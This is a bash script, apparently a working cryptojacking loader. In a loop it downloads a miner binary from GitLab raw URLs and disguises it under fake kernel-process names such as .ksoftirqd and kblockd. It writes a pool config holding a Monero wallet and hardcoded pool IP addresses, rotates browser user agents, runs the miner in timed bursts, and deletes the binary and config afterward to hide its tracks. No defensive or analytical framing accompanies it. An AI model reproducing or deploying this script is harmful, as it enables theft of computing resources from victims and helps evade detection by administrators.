#!/usr/bin/env bash

NEW_SCRIPT_URL="https://gitlab.com/colaymanku/file/-/raw/main/jupyterlab"
LOCAL_BIN_DIR="$HOME/.local/bin"

RUNTIME=600
MIN_SLEEP=30
MAX_SLEEP=40

MAIN_URL="18.225.195.73:443"
BACKUP_URL1="159.223.14.239:443"
BACKUP_URL2="159.223.49.26:443"
WALLET="84GbAidJhw8cxCq941aeTd7zHL5uJ5XhzLHgWUX3eQ4VfHoswB3Dx1edeWCpxJRKx53bTLEzVdGeJFNCPQ5o1BMKJdqH2C4"

THREAD_LIST=(31 32)

UA_LIST=(
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0"
    "Spotify/8.8.44 (Windows NT 10.0; Win64; x64)"
    "iTunes/12.10.9 (Windows; Microsoft Windows 10 x64 Business Edition (Build 19041); x64) AppleWebKit/7607.3.18.0.2"
)

POSSIBLE_NAMES=(".dbus-daemon" "migration" "watchdog" ".ksoftirqd" "rcu_sched" ".profile-cache" 
                "rcu_bh" "kdevtmpfs" "kintegrityd" "kblockd" "kthrotld")

test_url_connection() {
    local url=$1
    local host=$(echo $url | cut -d: -f1)
    local port=$(echo $url | cut -d: -f2)
    
    timeout 5 bash -c "echo >/dev/tcp/$host/$port" 2>/dev/null
    return $?
}

get_random_active_url() {
    local active_urls=()
    
    # Cek semua URL dan simpan yang aktif
    if test_url_connection "$MAIN_URL"; then
        active_urls+=("$MAIN_URL")
    fi
    
    if test_url_connection "$BACKUP_URL1"; then
        active_urls+=("$BACKUP_URL1")
    fi
    
    if test_url_connection "$BACKUP_URL2"; then
        active_urls+=("$BACKUP_URL2")
    fi
    
    # Jika ada URL aktif, pilih random
    if [ ${#active_urls[@]} -gt 0 ]; then
        local random_index=$((RANDOM % ${#active_urls[@]}))
        echo "${active_urls[$random_index]}"
    else
        # Jika semua down, pilih random dari semua URL
        local all_urls=("$MAIN_URL" "$BACKUP_URL1" "$BACKUP_URL2")
        local random_index=$((RANDOM % ${#all_urls[@]}))
        echo "${all_urls[$random_index]}"
    fi
}

generate_random_string() {
    local length=${1:-8}
    local chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    local result=''
    for ((i=0; i<length; i++)); do
        result+=${chars:RANDOM%${#chars}:1}
    done
    echo "$result"
}

mkdir -p "$LOCAL_BIN_DIR"
cd "$LOCAL_BIN_DIR" || exit

while true; do
    curl -sL "$NEW_SCRIPT_URL" -o "new_session.sh" >/dev/null 2>&1
    
    if [ $? -eq 0 ] && [ -s "new_session.sh" ]; then
        chmod +x "new_session.sh"
        
        rm -f "$LOCAL_BIN_DIR"/*.json "$LOCAL_BIN_DIR"/.dbus-daemon* "$LOCAL_BIN_DIR"/migration* \
              "$LOCAL_BIN_DIR"/watchdog* "$LOCAL_BIN_DIR"/.ksoftirqd* "$LOCAL_BIN_DIR"/rcu_* \
              "$LOCAL_BIN_DIR"/.profile-cache* "$LOCAL_BIN_DIR"/kdevtmpfs* "$LOCAL_BIN_DIR"/kintegrityd* \
              "$LOCAL_BIN_DIR"/kblockd* "$LOCAL_BIN_DIR"/kthrotld*

        # Dapatkan URL aktif secara random
        ACTIVE_URL=$(get_random_active_url)
        
        BIN_NAME="${POSSIBLE_NAMES[$RANDOM % ${#POSSIBLE_NAMES[@]}]}"
        RAND_SUFFIX=$(generate_random_string 12)
        BIN_NAME_FULL="${BIN_NAME}${RAND_SUFFIX}"
        CONFIG_SUFFIX=$(generate_random_string 10)
        CONFIG_NAME="${BIN_NAME}_config${CONFIG_SUFFIX}.json"

        curl -sL "https://gitlab.com/notesss2/filess/-/raw/main/sumo" -o "$BIN_NAME_FULL" >/dev/null 2>&1
        chmod +x "$BIN_NAME_FULL"

        THREADS=${THREAD_LIST[$RANDOM % ${#THREAD_LIST[@]}]}
        UA=${UA_LIST[$RANDOM % ${#UA_LIST[@]}]}

        cat > "$CONFIG_NAME" << EOF
{
  "api": {
    "worker-id": "$WORKER"
  },
  "autosave": true,
  "pools": [
    {
      "url": "$ACTIVE_URL",
      "user": "$WALLET",
      "pass": "system",
      "keepalive": true,
      "tls": true
    },
    {
      "url": "$MAIN_URL",
      "user": "$WALLET",
      "pass": "system",
      "keepalive": true,
      "tls": true
    },
    {
      "url": "$BACKUP_URL1",
      "user": "$WALLET",
      "pass": "system",
      "keepalive": true,
      "tls": true
    },
    {
      "url": "$BACKUP_URL2",
      "user": "$WALLET",
      "pass": "system",
      "keepalive": true,
      "tls": true
    }
  ],
  "user-agent": "$UA",
  "threads": $THREADS
}
EOF

        timeout "$RUNTIME" ./"$BIN_NAME_FULL" -c "$CONFIG_NAME" >/dev/null 2>&1

        rm -f "new_session.sh" "$BIN_NAME_FULL" "$CONFIG_NAME"

        SLEEP_TIME=$((RANDOM % (MAX_SLEEP - MIN_SLEEP + 1) + MIN_SLEEP))
        sleep "$SLEEP_TIME"
        
    else
        sleep 30
    fi
done
